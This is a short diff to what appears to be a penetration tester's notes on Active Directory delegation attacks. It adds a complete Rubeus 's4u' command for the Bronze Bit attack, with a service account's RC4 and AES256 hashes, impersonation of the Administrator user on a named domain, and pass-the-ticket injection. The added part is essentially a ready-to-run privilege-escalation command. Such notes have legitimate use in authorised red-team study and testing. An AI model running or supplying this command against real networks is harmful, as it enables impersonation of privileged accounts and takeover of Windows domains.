@@ -74,3 +74,7 @@ Impersonate if SYSTEM on a computer with contrained delegation
         # undo the impersonation context
         $Context.Undo()
         
+Bronzebit with Rubeus
+        (Administrator is a sensitive user; must have rc4 and aes256)
+        rubeus s4u /user:svc_sql /rc4:e04c4ef54a1a6f4e4fc0de22f0b5fb2d /aes256:dc34e2c3a61b51a3d4f4e119a220e13eb575bab477977802c1f8cad4ed89fdcf 
+        /impersonateuser:Administrator /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" altservice:http /bronzebit /ptt
